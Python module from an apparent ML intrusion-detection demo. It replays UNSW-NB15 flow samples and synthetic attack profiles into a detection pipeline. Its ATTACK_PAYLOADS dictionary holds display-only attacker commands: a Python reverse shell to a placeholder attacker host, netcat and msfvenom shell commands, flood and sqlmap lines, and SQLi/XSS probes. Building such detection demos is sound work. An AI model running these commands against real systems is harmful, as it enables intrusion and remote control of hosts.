"""
Attack Simulator - Generates realistic attack samples for ML model demonstration.

Loads samples from UNSW-NB15 dataset and injects them into the pipeline
without requiring Zeek or tcpreplay. Falls back to synthetic generation if dataset unavailable.
"""
from __future__ import annotations

import asyncio
import random
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Awaitable, Dict, List, Optional

import pandas as pd

from .config import BackendConfig


# Attack type mappings (normalized names)
ATTACK_TYPES = {
    "normal": "Normal",
    "generic": "Generic",
    "exploits": "Exploits",
    "fuzzers": "Fuzzers",
    "dos": "DoS",
    "recon": "Reconnaissance",
    "reconnaissance": "Reconnaissance",
    "analysis": "Analysis",
    "backdoor": "Backdoor",
    "backdoors": "Backdoor",
    "shellcode": "Shellcode",
    "worms": "Worms",
}

# Features needed for the model (must match exactly what model was trained on)
# 39 features - removed stcpb, dtcpb as they're not useful for detection
MODEL_FEATURES = [
    'dur', 'proto', 'service', 'state', 'spkts', 'dpkts', 'sbytes', 'dbytes',
    'sttl', 'dttl', 'sload', 'dload', 'sloss', 'dloss', 'sinpkt', 'dinpkt',
    'sjit', 'djit', 'swin', 'dwin', 'tcprtt', 'synack',
    'ackdat', 'smean', 'dmean', 'trans_depth', 'response_body_len',
    'ct_srv_src', 'ct_state_ttl', 'ct_dst_ltm', 'ct_src_dport_ltm',
    'ct_dst_sport_ltm', 'ct_dst_src_ltm', 'is_ftp_login', 'ct_ftp_cmd',
    'ct_flw_http_mthd', 'ct_src_ltm', 'ct_srv_dst', 'is_sm_ips_ports'
]

# Synthetic attack profiles - realistic feature patterns for each attack type
# These are based on typical characteristics of each attack category
SYNTHETIC_ATTACK_PROFILES = {
    "dos": {
        "dur": (0.001, 0.5),  # Short duration floods
        "proto": ["tcp", "udp", "icmp"],
        "service": ["-", "http", "dns"],
        "state": ["S0", "REJ", "RSTO"],
        "spkts": (100, 10000),  # High packet count
        "dpkts": (0, 100),
        "sbytes": (5000, 500000),  # High bytes
        "dbytes": (0, 1000),
        "sttl": (64, 128),
        "dttl": (0, 64),
        "sload": (100000, 10000000),  # High load
        "dload": (0, 10000),
        "sloss": (0, 100),
        "dloss": (0, 50),
        "ct_srv_src": (50, 500),  # Many connections
        "ct_dst_ltm": (100, 1000),
    },
    "exploits": {
        "dur": (0.1, 30),
        "proto": ["tcp"],
        "service": ["http", "ftp", "ssh", "smb"],
        "state": ["SF", "S1", "RSTR"],
        "spkts": (10, 500),
        "dpkts": (5, 200),
        "sbytes": (500, 50000),
        "dbytes": (100, 20000),
        "sttl": (64, 128),
        "dttl": (64, 128),
        "sload": (1000, 100000),
        "dload": (500, 50000),
        "trans_depth": (1, 10),
        "response_body_len": (100, 10000),
    },
    "reconnaissance": {
        "dur": (0.001, 2),  # Quick scans
        "proto": ["tcp", "udp", "icmp"],
        "service": ["-"],
        "state": ["S0", "REJ", "RSTO", "OTH"],
        "spkts": (1, 10),  # Few packets per probe
        "dpkts": (0, 5),
        "sbytes": (40, 500),
        "dbytes": (0, 200),
        "sttl": (64, 255),
        "dttl": (0, 128),
        "ct_srv_src": (1, 50),
        "ct_dst_ltm": (10, 500),  # Many destinations
        "ct_src_dport_ltm": (50, 1000),  # Port scanning
    },
    "backdoor": {
        "dur": (1, 3600),  # Long-lived connections
        "proto": ["tcp"],
        "service": ["-", "http", "ssl"],
        "state": ["SF", "S1"],
        "spkts": (10, 1000),
        "dpkts": (10, 1000),
        "sbytes": (100, 10000),
        "dbytes": (100, 10000),
        "sttl": (64, 128),
        "dttl": (64, 128),
        "sjit": (0.001, 1),
        "djit": (0.001, 1),
        "ct_srv_src": (1, 10),  # Few connections, persistent
    },
    "fuzzers": {
        "dur": (0.01, 5),
        "proto": ["tcp", "udp"],
        "service": ["http", "ftp", "-"],
        "state": ["SF", "REJ", "RSTR"],
        "spkts": (5, 100),
        "dpkts": (1, 50),
        "sbytes": (100, 5000),
        "dbytes": (0, 2000),
        "sttl": (64, 128),
        "dttl": (64, 128),
        "ct_flw_http_mthd": (1, 20),  # Many HTTP methods
        "trans_depth": (1, 5),
    },
    "shellcode": {
        "dur": (0.1, 10),
        "proto": ["tcp"],
        "service": ["http", "ftp", "smb", "-"],
        "state": ["SF", "S1"],
        "spkts": (5, 50),
        "dpkts": (3, 30),
        "sbytes": (200, 5000),  # Shellcode payload
        "dbytes": (50, 2000),
        "sttl": (64, 128),
        "dttl": (64, 128),
        "smean": (100, 1000),
        "dmean": (50, 500),
    },
    "worms": {
        "dur": (0.01, 5),
        "proto": ["tcp", "udp"],
        "service": ["smb", "-", "http"],
        "state": ["SF", "S0", "REJ"],
        "spkts": (5, 200),
        "dpkts": (2, 100),
        "sbytes": (200, 20000),
        "dbytes": (50, 5000),
        "sttl": (64, 128),
        "dttl": (64, 128),
        "ct_dst_ltm": (50, 500),  # Spreading to many hosts
        "ct_dst_src_ltm": (10, 200),
    },
    "analysis": {
        "dur": (1, 60),
        "proto": ["tcp", "udp"],
        "service": ["http", "dns", "-"],
        "state": ["SF"],
        "spkts": (10, 500),
        "dpkts": (10, 500),
        "sbytes": (500, 50000),
        "dbytes": (500, 50000),
        "sttl": (64, 128),
        "dttl": (64, 128),
    },
    "generic": {
        "dur": (0.1, 30),
        "proto": ["tcp", "udp"],
        "service": ["http", "-"],
        "state": ["SF", "S0"],
        "spkts": (5, 100),
        "dpkts": (3, 80),
        "sbytes": (200, 10000),
        "dbytes": (100, 5000),
        "sttl": (64, 128),
        "dttl": (64, 128),
    },
}


@dataclass
class SimulationResult:
    success: bool
    message: str
    attack_type: str = ""
    samples_injected: int = 0


# Realistic attack payloads and commands for visualization
ATTACK_PAYLOADS = {
    "dos": {
        "commands": [
            "hping3 -S --flood -V -p 80 {target}",
            "slowloris.py {target} -p 80 -s 500",
            "python3 -c 'import socket; [socket.socket().connect((\"{target}\",80)) for _ in range(10000)]'",
        ],
        "packets": [
            "SYN flood → {target}:80 [seq=0x{seq:08x}]",
            "TCP RST storm → {target}:443",
            "UDP amplification → {target}:53",
            "ICMP echo flood → {target}",
        ],
        "description": "Denial of Service - Overwhelming target with traffic",
    },
    "exploits": {
        "commands": [
            "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'",
            "python3 exploit.py --target {target} --port 445 --payload shellcode.bin",
            "curl -X POST {target}/api/v1/exec -d 'cmd=id'",
        ],
        "packets": [
            "SMB exploit → {target}:445 [EternalBlue]",
            "HTTP RCE → {target}:8080 [CVE-2021-44228]",
            "Buffer overflow → {target}:21 [ProFTPD]",
        ],
        "description": "Exploitation - Leveraging vulnerabilities for access",
    },
    "reconnaissance": {
        "commands": [
            "nmap -sS -sV -O {target}",
            "masscan -p1-65535 {target} --rate=1000",
            "dirb http://{target}/ /usr/share/wordlists/dirb/common.txt",
        ],
        "packets": [
            "SYN scan → {target}:1-1024",
            "Service probe → {target}:22 [SSH banner]",
            "HTTP enum → {target}:80 [GET /admin]",
        ],
        "description": "Reconnaissance - Scanning and enumeration",
    },
    "backdoor": {
        "commands": [
            "nc -lvp 4444 -e /bin/bash",
            "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{attacker}\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            "msfvenom -p linux/x64/shell_reverse_tcp LHOST={attacker} LPORT=4444 -f elf > shell.elf",
        ],
        "packets": [
            "C2 beacon → {attacker}:4444 [heartbeat]",
            "Reverse shell → {attacker}:443 [encrypted]",
            "DNS tunnel → {attacker}:53 [exfil data]",
        ],
        "description": "Backdoor/C2 - Command and control communication",
    },
    "fuzzers": {
        "commands": [
            "wfuzz -c -z file,/usr/share/wordlists/fuzz.txt {target}/FUZZ",
            "ffuf -u {target}/FUZZ -w wordlist.txt -mc 200",
            "sqlmap -u '{target}/page?id=1' --batch --dbs",
        ],
        "packets": [
            "HTTP fuzz → {target}:80 [payload: '{{{{%s}}}}']",
            "SQL injection → {target}:3306 [' OR 1=1--]",
            "XSS probe → {target}:80 [<script>alert(1)</script>]",
        ],
        "description": "Fuzzing - Testing inputs for vulnerabilities",
    },
    "shellcode": {
        "commands": [
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={attacker} -f c",
            "python3 -c 'shellcode = b\"\\x48\\x31\\xc0\\x48\\x89\\xc2...\"; exec(shellcode)'",
            "objdump -d payload.bin | grep -A20 '<_start>'",
        ],
        "packets": [
            "Shellcode injection → {target}:445 [stage1: 0x{seq:04x}]",
            "Payload delivery → {target}:80 [encoded: base64]",
            "Memory write → {target} [addr: 0x7fff{seq:04x}]",
        ],
        "description": "Shellcode - Injecting executable code",
    },
    "worms": {
        "commands": [
            "python3 worm.py --spread --target-range 192.168.1.0/24",
            "for ip in $(seq 1 254); do nc -zv 192.168.1.$ip 445; done",
            "psexec.py {target} -c payload.exe",
        ],
        "packets": [
            "Lateral movement → 192.168.1.{seq}:445",
            "SMB spread → {target}:139 [ADMIN$]",
            "WMI exec → {target}:135 [remote cmd]",
        ],
        "description": "Worm - Self-propagating malware",
    },
    "analysis": {
        "commands": [
            "tcpdump -i eth0 -w capture.pcap host {target}",
            "wireshark -k -i eth0 -f 'host {target}'",
            "tshark -r traffic.pcap -Y 'ip.addr=={target}'",
        ],
        "packets": [
            "Traffic analysis → {target} [protocol stats]",
            "Flow inspection → {target}:* [deep packet]",
            "Metadata extract → {target} [headers]",
        ],
        "description": "Analysis - Traffic inspection and monitoring",
    },
    "generic": {
        "commands": [
            "python3 attack.py --target {target} --mode aggressive",
            "curl -X POST {target}/api -H 'X-Forwarded-For: 127.0.0.1'",
            "wget --spider -r -l 5 {target}",
        ],
        "packets": [
            "Malicious request → {target}:80",
            "Suspicious traffic → {target}:443",
            "Anomalous pattern → {target}:*",
        ],
        "description": "Generic - Unclassified malicious activity",
    },
}


class AttackSimulator:
    """Simulates attacks by injecting real dataset samples into the pipeline."""
    
    def __init__(self, cfg: BackendConfig):
        self._cfg = cfg
        self._samples: Dict[str, List[Dict[str, Any]]] = {}
        self._validated_samples: Dict[str, List[Dict[str, Any]]] = {}  # Samples validated by model
        self._loaded = False
        self._running = False
        self._task: Optional[asyncio.Task] = None
        self._has_real_ips = False  # Will be set to True if raw dataset loaded
    
    def _load_samples(self) -> bool:
        """Load attack samples from UNSW-NB15 dataset with REAL IPs."""
        if self._loaded:
            return True
        
        dataset_dir = self._cfg.project_root / "Dataset"
        
        # Try to load raw dataset files first (they have real IPs)
        raw_files = [
            dataset_dir / "UNSW-NB15_1.csv",
            dataset_dir / "UNSW-NB15_2.csv",
            dataset_dir / "UNSW-NB15_3.csv",
            dataset_dir / "UNSW-NB15_4.csv",
        ]
        
        # Column names for raw dataset (no header in file)
        RAW_COLUMNS = [
            'srcip', 'sport', 'dstip', 'dsport', 'proto', 'state', 'dur',
            'sbytes', 'dbytes', 'sttl', 'dttl', 'sloss', 'dloss', 'service',
            'sload', 'dload', 'spkts', 'dpkts', 'swin', 'dwin', 'stcpb', 'dtcpb',
            'smean', 'dmean', 'trans_depth', 'response_body_len', 'sjit', 'djit',
            'stime', 'ltime', 'sinpkt', 'dinpkt', 'tcprtt', 'synack', 'ackdat',
            'is_sm_ips_ports', 'ct_state_ttl', 'ct_flw_http_mthd', 'is_ftp_login',
            'ct_ftp_cmd', 'ct_srv_src', 'ct_srv_dst', 'ct_dst_ltm', 'ct_src_ltm',
            'ct_src_dport_ltm', 'ct_dst_sport_ltm', 'ct_dst_src_ltm', 'attack_cat', 'label'
        ]
        
        try:
            # Check if raw files exist
            existing_raw = [f for f in raw_files if f.exists()]
            
            if existing_raw:
                # Load from raw files (with real IPs)
                dfs = []
                for f in existing_raw[:2]:  # Load first 2 files to save memory
                    df = pd.read_csv(f, header=None, names=RAW_COLUMNS, low_memory=False)
                    dfs.append(df)
                df = pd.concat(dfs, ignore_index=True)
                self._has_real_ips = True
                print(f"[Simulator] Loaded {len(df)} samples with REAL IPs from raw dataset")
            else:
                # Fallback to training set (no real IPs)
                train_file = dataset_dir / "UNSW_NB15_training-set.csv"
                if not train_file.exists():
                    return False
                df = pd.read_csv(train_file, low_memory=False)
                self._has_real_ips = False
                print(f"[Simulator] Loaded {len(df)} samples from training set (generated IPs)")
            
            # Group by attack category and sample
            for attack_cat in df['attack_cat'].dropna().unique():
                attack_df = df[df['attack_cat'] == attack_cat]
                # Take up to 100 samples per attack type for variety
                samples = attack_df.sample(n=min(100, len(attack_df))).to_dict('records')
                
                # Normalize attack name
                norm_name = str(attack_cat).strip().lower()
                if norm_name in ATTACK_TYPES:
                    norm_name = ATTACK_TYPES[norm_name].lower()
                
                self._samples[norm_name] = samples
            
            # Also get normal traffic samples
            normal_df = df[df['label'] == 0]
            self._samples['normal'] = normal_df.sample(n=min(100, len(normal_df))).to_dict('records')
            
            self._loaded = True
            return True
            
        except Exception as e:
            print(f"[Simulator] Failed to load samples: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def get_available_attacks(self) -> List[str]:
        """Get list of available attack types."""
        self._load_samples()
        return [k for k in self._samples.keys() if k != 'normal']
    
    def get_sample(self, attack_type: str, model_wrapper=None) -> Optional[Dict[str, Any]]:
        """Get a random sample for the given attack type.
        
        If model_wrapper is provided, tries to find a sample that the model
        correctly classifies as the requested attack type.
        """
        self._load_samples()
        
        # Normalize attack type
        norm_type = attack_type.strip().lower()
        if norm_type in ATTACK_TYPES:
            norm_type = ATTACK_TYPES[norm_type].lower()
        
        samples = self._samples.get(norm_type, [])
        if not samples:
            return None
        
        # If no model provided, return random sample
        if model_wrapper is None:
            return random.choice(samples)
        
        # Check if we have validated samples cached
        if norm_type in self._validated_samples and self._validated_samples[norm_type]:
            return random.choice(self._validated_samples[norm_type])
        
        # Build validated samples cache
        validated = []
        shuffled = samples.copy()
        random.shuffle(shuffled)
        
        for sample in shuffled[:50]:  # Check up to 50 samples
            features = self.sample_to_features(sample)
            ml_result = model_wrapper.score_conn_features(features)
            predicted = ml_result.predicted_label.lower()
            
            # Check if prediction matches requested attack type
            if predicted == norm_type or predicted == norm_type.rstrip('s'):
                validated.append(sample)
            # Handle variations (e.g., "dos" vs "DoS")
            elif norm_type in predicted.lower() or predicted.lower() in norm_type:
                validated.append(sample)
        
        # Cache validated samples
        if validated:
            self._validated_samples[norm_type] = validated
            return random.choice(validated)
        
        # Fallback to random sample if no matching prediction found
        print(f"[Simulator] Warning: No samples found where model predicts {norm_type}")
        return random.choice(samples)
    
    def get_random_attack_sample(self) -> Optional[Dict[str, Any]]:
        """Get a random attack sample (any type except normal)."""
        self._load_samples()
        
        attack_types = [k for k in self._samples.keys() if k != 'normal']
        if not attack_types:
            return None
        
        attack_type = random.choice(attack_types)
        return self.get_sample(attack_type)
    
    def sample_to_zeek_record(self, sample: Dict[str, Any]) -> Dict[str, Any]:
        """Convert UNSW-NB15 sample to Zeek-like conn.log record."""
        
        # Use REAL IPs from dataset if available, otherwise generate
        if self._has_real_ips and 'srcip' in sample:
            src_ip = str(sample.get('srcip', '0.0.0.0'))
            dst_ip = str(sample.get('dstip', '0.0.0.0'))
            src_port = int(sample.get('sport', random.randint(1024, 65535)))
            dst_port = int(sample.get('dsport', 80))
            # Use real timestamp if available (Unix epoch)
            ts = sample.get('stime', datetime.now(timezone.utc).timestamp())
            if isinstance(ts, (int, float)) and ts > 1000000000:
                # Valid Unix timestamp
                pass
            else:
                ts = datetime.now(timezone.utc).timestamp()
        else:
            # Fallback to generated IPs
            src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            dst_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 22, 445, 3389, 1434, 53, 8080])
            ts = datetime.now(timezone.utc).timestamp()
        
        return {
            "ts": ts,
            "uid": f"C{random.randint(100000, 999999)}",
            "id.orig_h": src_ip,
            "id.orig_p": src_port,
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "proto": str(sample.get("proto", "tcp")).lower(),
            "service": str(sample.get("service", "-")).lower(),
            "duration": float(sample.get("dur", 0)),
            "orig_bytes": int(sample.get("sbytes", 0)),
            "resp_bytes": int(sample.get("dbytes", 0)),
            "conn_state": str(sample.get("state", "SF")),
            "orig_pkts": int(sample.get("spkts", 0)),
            "resp_pkts": int(sample.get("dpkts", 0)),
            "missed_bytes": 0,
        }
    
    def sample_to_features(self, sample: Dict[str, Any]) -> Dict[str, Any]:
        """Convert sample to feature dict for ML model."""
        import numpy as np
        
        CATEGORICAL_COLS = {'proto', 'service', 'state'}
        
        def safe_float(val):
            """Safely convert value to float."""
            if val is None:
                return 0.0
            if isinstance(val, (int, float)):
                if isinstance(val, float) and np.isnan(val):
                    return 0.0
                return float(val)
            if isinstance(val, str):
                val = val.strip()
                if not val or val == '-' or val.lower() == 'nan':
                    return 0.0
                try:
                    return float(val)
                except ValueError:
                    return 0.0
            return 0.0
        
        features = {}
        for col in MODEL_FEATURES:
            if col in CATEGORICAL_COLS:
                # Keep categorical as string
                val = sample.get(col, '')
                if val is None or (isinstance(val, str) and not val.strip()) or val == '-':
                    val = 'unknown'
                features[col] = str(val).strip().lower()
            elif col in sample:
                features[col] = safe_float(sample[col])
            else:
                features[col] = 0.0
        return features
    
    async def simulate_attack(
        self,
        attack_type: Optional[str],
        on_event: Callable[[Dict[str, Any]], Awaitable[None]],
        model_wrapper,
        count: int = 5,
        delay: float = 0.5,
    ) -> SimulationResult:
        """
        Simulate an attack by injecting samples into the pipeline.
        
        Args:
            attack_type: Attack type to simulate (None for random)
            on_event: Callback to send events to frontend
            model_wrapper: ML model wrapper for predictions
            count: Number of samples to inject
            delay: Delay between samples (seconds)
        """
        if not self._load_samples():
            return SimulationResult(
                success=False,
                message="Failed to load dataset. Ensure Dataset/UNSW_NB15_training-set.csv exists."
            )
        
        # Determine attack type
        if attack_type:
            norm_type = attack_type.strip().lower()
            if norm_type in ATTACK_TYPES:
                norm_type = ATTACK_TYPES[norm_type].lower()
            
            if norm_type not in self._samples:
                available = ", ".join(self.get_available_attacks())
                return SimulationResult(
                    success=False,
                    message=f"Unknown attack type: {attack_type}. Available: {available}"
                )
            selected_type = norm_type
        else:
            selected_type = random.choice(self.get_available_attacks())
        
        self._running = True
        injected = 0
        
        # Get attack payload info for realistic visualization
        payload_info = ATTACK_PAYLOADS.get(selected_type, ATTACK_PAYLOADS.get("generic", {}))
        
        # Get first sample to extract real IPs for VM setup
        first_sample = self.get_sample(selected_type, model_wrapper)
        if self._has_real_ips and first_sample and 'srcip' in first_sample:
            # Use REAL IPs from dataset
            attacker_ip = str(first_sample.get('srcip', '0.0.0.0'))
            victim_ip = str(first_sample.get('dstip', '0.0.0.0'))
        else:
            # Fallback to generated IPs
            attacker_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            victim_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        # Send VM setup event
        await on_event({
            "type": "vm_setup",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "attack_type": selected_type,
            "description": payload_info.get("description", "Attack simulation"),
            "attacker": {"ip": attacker_ip, "hostname": "kali-attacker"},
            "victim": {"ip": victim_ip, "hostname": "ubuntu-victim"},
        })
        
        try:
            for i in range(count):
                if not self._running:
                    break
                
                # Get sample - pass model to filter for correctly predicted samples
                sample = self.get_sample(selected_type, model_wrapper)
                if not sample:
                    continue
                
                # Convert to Zeek record - uses REAL IPs if available
                zeek_record = self.sample_to_zeek_record(sample)
                
                # Update attacker/victim IPs from this sample's real data
                if self._has_real_ips and 'srcip' in sample:
                    attacker_ip = str(sample.get('srcip', attacker_ip))
                    victim_ip = str(sample.get('dstip', victim_ip))
                
                # Send attacker command stream
                commands = payload_info.get("commands", [])
                if commands:
                    cmd = random.choice(commands).format(
                        target=victim_ip, 
                        attacker=attacker_ip,
                        seq=random.randint(0, 0xFFFF)
                    )
                    await on_event({
                        "type": "vm_stream",
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "vm": "attacker",
                        "stream": "command",
                        "content": f"root@kali:~# {cmd}",
                    })
                    await asyncio.sleep(0.1)
                
                # Send packet stream
                packets = payload_info.get("packets", [])
                if packets:
                    pkt = random.choice(packets).format(
                        target=victim_ip,
                        attacker=attacker_ip,
                        seq=random.randint(0, 0xFFFF)
                    )
                    await on_event({
                        "type": "vm_stream",
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "vm": "attacker",
                        "stream": "packet",
                        "content": pkt,
                    })
                    await asyncio.sleep(0.05)
                
                # Send victim log stream
                await on_event({
                    "type": "vm_stream",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "vm": "victim",
                    "stream": "log",
                    "content": f"[{datetime.now().strftime('%H:%M:%S')}] Connection from {attacker_ip}:{zeek_record['id.orig_p']} → :{zeek_record['id.resp_p']}",
                })
                
                # Send flow event
                await on_event({
                    "type": "flow",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "log": "conn",
                    "src": zeek_record["id.orig_h"],
                    "dst": zeek_record["id.resp_h"],
                    "record": zeek_record,
                    "simulated": True,
                })
                
                # Run ML prediction
                features = self.sample_to_features(sample)
                ml_result = model_wrapper.score_conn_features(features)
                
                # ML prediction is BLIND - model only sees network features, not attack_cat
                predicted_attack = ml_result.predicted_label
                
                # Get actual attack type from dataset (for comparison only - model doesn't see this)
                actual_attack = str(sample.get("attack_cat", "")).strip()
                if not actual_attack or actual_attack.lower() == "nan":
                    actual_attack = selected_type.title()
                
                # Handle binary vs multiclass comparison
                if ml_result.model_mode == "binary":
                    # Binary: Check if Attack/Normal matches
                    actual_is_attack = actual_attack.lower() not in {'normal', 'benign', ''}
                    predicted_is_attack = predicted_attack.lower() == 'attack'
                    is_correct = actual_is_attack == predicted_is_attack
                    match_indicator = "CORRECT" if is_correct else "MISMATCH"
                    # For display, show actual attack type with binary prediction
                    display_attack = f"{actual_attack} ({predicted_attack})"
                else:
                    # Multiclass: Direct comparison
                    is_correct = predicted_attack.lower() == actual_attack.lower()
                    match_indicator = "CORRECT" if is_correct else "MISMATCH"
                    display_attack = predicted_attack
                
                # Always generate alert for simulated attacks
                from .mitre import get_mitre_dict
                from .explainability import get_explainability_dict, ExplainabilityResult
                
                # MITRE mapping based on actual attack type (more meaningful for binary)
                mitre = get_mitre_dict(actual_attack.lower())
                
                # Build evidence - clearly show this is a blind test
                evidence = [
                    f"ML Prediction: {predicted_attack}",
                    f"Ground Truth: {actual_attack}",
                    f"{match_indicator}",
                    f"Confidence: {ml_result.malicious_score:.1%}",
                ]
                
                # Key features that influenced the prediction
                xai = ExplainabilityResult(
                    top_features=[
                        f"Bytes sent: {sample.get('sbytes', 0):,}",
                        f"Packets: {sample.get('spkts', 0)}",
                        f"Load: {sample.get('sload', 0):.1f} bps",
                        f"Duration: {sample.get('dur', 0):.3f}s",
                        f"TTL: {sample.get('sttl', 0)}",
                    ],
                    zeek_evidence=[
                        f"proto={sample.get('proto', 'tcp')}",
                        f"state={sample.get('state', 'SF')}",
                        f"service={sample.get('service', '-')}",
                    ],
                    confidence_factors=[
                        f"Model: {ml_result.model_mode}",
                        f"Prediction: {predicted_attack}",
                        f"Actual: {actual_attack}",
                        f"Result: {match_indicator}",
                    ]
                )
                
                await on_event({
                    "type": "attack_alert",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "attack": display_attack,  # Show actual attack type for binary
                    "confidence": ml_result.malicious_score,
                    "src": zeek_record["id.orig_h"],
                    "dst": zeek_record["id.resp_h"],
                    "evidence": evidence,
                    "ml": {
                        "malicious_score": float(ml_result.malicious_score),
                        "model_mode": str(ml_result.model_mode),
                        "predicted_label": str(ml_result.predicted_label),
                        "raw_class": ml_result.raw_class,
                    },
                    "mitre": mitre,
                    "explainability": get_explainability_dict(xai),
                    "simulated": True,
                })
                
                injected += 1
                await asyncio.sleep(delay)
        
        finally:
            self._running = False
        
        ip_info = "with REAL IPs" if self._has_real_ips else "with generated IPs"
        return SimulationResult(
            success=True,
            message=f"Simulated {injected} {selected_type.title()} attack(s) {ip_info}",
            attack_type=selected_type,
            samples_injected=injected,
        )
    
    def stop(self) -> None:
        """Stop ongoing simulation."""
        self._running = False
        if self._task:
            self._task.cancel()
            self._task = None
